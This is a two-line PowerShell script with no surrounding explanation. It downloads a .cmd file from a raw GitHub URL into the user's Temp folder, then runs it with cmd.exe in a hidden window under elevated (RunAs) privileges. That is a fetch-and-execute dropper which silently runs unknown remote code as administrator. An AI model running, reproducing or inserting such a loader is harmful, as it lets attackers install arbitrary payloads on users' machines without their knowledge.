Invoke-WebRequest "https://raw.githubusercontent.com/ghrkkaa-sys/a/refs/heads/main/pl1.cmd" -OutFile "$env:LocalAppData\Temp\pl1.cmd"
Start-Process "cmd.exe" "$env:LocalAppData\Temp\pl1.cmd" -WindowStyle Hidden -Verb RunAs
